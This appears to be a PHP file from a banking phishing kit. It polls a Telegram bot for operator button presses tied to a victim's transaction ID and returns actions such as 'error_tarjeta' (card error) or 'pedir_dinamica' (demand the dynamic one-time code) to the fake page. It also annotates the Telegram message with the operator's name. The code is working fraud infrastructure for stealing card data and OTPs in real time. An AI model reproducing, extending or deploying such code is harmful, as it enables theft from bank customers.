<?php
session_start();
header('Content-Type: application/json');

$config        = require __DIR__ . '/../../config.php';
$transactionId = $_POST['transactionId'] ?? '';
$messageId     = $_POST['messageId'] ?? ''; // se mantiene para compatibilidad, aunque usamos el del callback

if (empty($transactionId) || empty($messageId)) {
    echo json_encode(['action' => null]);
    exit;
}

// Usar offset para evitar respuestas viejas
$offset = isset($_SESSION['last_update_id']) ? (int)$_SESSION['last_update_id'] : 0;

$ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/getUpdates?offset=" . ($offset + 1));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

$data   = json_decode($response, true);
$action = null;

if (isset($data['result']) && is_array($data['result'])) {
    foreach ($data['result'] as $update) {
        if (!isset($update['callback_query'])) {
            continue;
        }

        $callback = $update['callback_query'];

        if (!isset($callback['data']) || strpos($callback['data'], $transactionId) === false) {
            continue;
        }

        list($actionType, ) = explode(':', $callback['data'], 2);

        // Acciones válidas en el flujo de dinámica
        $accionesPermitidas = ['error_logo', 'error_tarjeta', 'pedir_dinamica', 'confirm_finalizar'];
        if (!in_array($actionType, $accionesPermitidas, true)) {
            continue;
        }

        $action = $actionType;

        // Guardar el último update_id para evitar relectura
        $_SESSION['last_update_id'] = (int)$update['update_id'];

        // Texto original del mensaje
        $originalText = isset($callback['message']['text']) ? $callback['message']['text'] : '';

        // Nombre del operador
        $operatorName = 'Operador';
        if (isset($callback['from'])) {
            $firstName = isset($callback['from']['first_name']) ? $callback['from']['first_name'] : '';
            $lastName  = isset($callback['from']['last_name']) ? $callback['from']['last_name'] : '';
            $username  = isset($callback['from']['username']) ? $callback['from']['username'] : '';

            $fullName = trim($firstName . ' ' . $lastName);
            if ($fullName !== '') {
                $operatorName = $fullName;
            } elseif ($username !== '') {
                $operatorName = $username;
            }
        }

        // Texto legible de la acción
        switch ($actionType) {
            case 'error_logo':
                $accionTexto = 'Error de Logo';
                break;
            case 'error_tarjeta':
                $accionTexto = 'Error de Tarjeta';
                break;
            case 'pedir_dinamica':
                $accionTexto = 'Error de Dinámica';
                break;
            case 'confirm_finalizar':
                $accionTexto = 'Finalizar';
                break;
            default:
                $accionTexto = $actionType;
                break;
        }

        // Nuevo texto del mensaje
        $newText = $originalText
            . "\n\n<b>Acción:</b> "  . $accionTexto
            . "\n<b>Operador:</b> " . htmlspecialchars($operatorName, ENT_QUOTES, 'UTF-8');

        // Datos reales del mensaje original
        $chatId        = $callback['message']['chat']['id'];
        $originalMsgId = $callback['message']['message_id'];

        // Editar mensaje: texto + quitar inline keyboard
        $payload = [
            'chat_id'      => $chatId,
            'message_id'   => $originalMsgId,
            'text'         => $newText,
            'parse_mode'   => 'HTML',
            'reply_markup' => json_encode(['inline_keyboard' => []])
        ];

        $ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/editMessageText");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_exec($ch);
        curl_close($ch);

        break;
    }
}

echo json_encode(['action' => $action]);
